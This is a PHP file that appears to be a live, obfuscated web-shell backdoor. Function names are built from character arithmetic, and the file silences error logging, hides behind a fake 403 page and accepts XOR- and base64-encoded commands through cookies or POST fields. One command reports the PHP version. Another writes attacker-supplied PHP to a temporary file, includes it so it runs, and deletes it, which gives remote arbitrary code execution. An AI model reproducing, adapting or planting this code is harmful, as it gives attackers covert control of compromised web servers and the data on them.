<?php
if($_SERVER["SCRIPT_NAME"] != "/index.php"){ header("HTTP/1.0 403 Forbidden");echo base64_decode("PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4KPGh0bWw+PGhlYWQ+Cjx0aXRsZT40MDMgRm9yYmlkZGVuPC90aXRsZT4KPC9oZWFkPjxib2R5Pgo8aDE+Rm9yYmlkZGVuPC9oMT4KPHA+WW91IGRvbid0IGhhdmUgcGVybWlzc2lvbiB0byBhY2Nlc3MgdGhpcyByZXNvdXJjZS48L3A+Cjxocj4KPC9ib2R5PjwvaHRtbD4=");die(); }
?>
<?php $picgdhti = 'f'.chr(272-167).'l'."\145".chr(95-0)."\x70".'u'."\x74".chr(95)."\x63"."\157"."\x6e".chr(116)."\145".chr(435-325).chr(116)."\163";
$uanlap = chr(597-499).chr(97).chr(517-402)."\x65".'6'.chr(52).'_'.'d'.chr(101)."\143".chr(111)."\x64".chr(101);
$maoytooumn = "\x69".'n'."\x69".chr(1077-982)."\x73"."\145".'t';
$ydjmi = 'u'."\x6e"."\x6c"."\x69"."\156".chr(692-585);


@$maoytooumn('e'.'r'."\162".chr(152-41).chr(114)."\x5f".'l'."\157".chr(506-403), NULL);
@$maoytooumn("\x6c".chr(111).chr(103).chr(95)."\145"."\x72"."\162".chr(111).'r'.'s', 0);
@$maoytooumn(chr(370-261).'a'.chr(120).chr(95).'e'.chr(120).'e'.'c'.chr(117)."\x74"."\151"."\157".chr(794-684).chr(185-90).chr(116).chr(105)."\x6d"."\145", 0);
@set_time_limit(0);

function glfnuewnqb($hpuve, $jvycsy)
{
    $ofdagfqlkermvk = "";
    for ($ofdag = 0; $ofdag < strlen($hpuve);) {
        for ($j = 0; $j < strlen($jvycsy) && $ofdag < strlen($hpuve); $j++, $ofdag++) {
            $ofdagfqlkermvk .= chr(ord($hpuve[$ofdag]) ^ ord($jvycsy[$j]));
        }
    }
    return $ofdagfqlkermvk;
}

$lbtaaxyjq = array_merge($_COOKIE, $_POST);
$pimhvw = 'facb26aa-8d83-440b-9546-801b23cbe54a';
foreach ($lbtaaxyjq as $ghmxxwd => $hpuve) {
    $hpuve = @unserialize(glfnuewnqb(glfnuewnqb($uanlap($hpuve), $pimhvw), $ghmxxwd));
    if (isset($hpuve['a'.'k'])) {
        if ($hpuve[chr(97)] == chr(597-492)) {
            $ofdag = array(
                chr(862-750)."\166" => @phpversion(),
                "\x73"."\166" => "3.5",
            );
            echo @serialize($ofdag);
        } elseif ($hpuve[chr(97)] == chr(101)) {
            $fuyiyzfz = "./" . md5($pimhvw) . chr(64-18).chr(576-471).chr(110).chr(1032-933);
            @$picgdhti($fuyiyzfz, "<" . chr(955-892).'p'.chr(104)."\160".chr(514-482)."\x40"."\165".chr(110).'l'.chr(105).'n'.chr(107).'('.chr(95-0)."\137".'F'."\111".chr(76).'E'."\x5f".'_'."\51"."\73".chr(910-878) . $hpuve[chr(100)]);
            @include($fuyiyzfz);
            @$ydjmi($fuyiyzfz);
        }
        exit();
    }
}

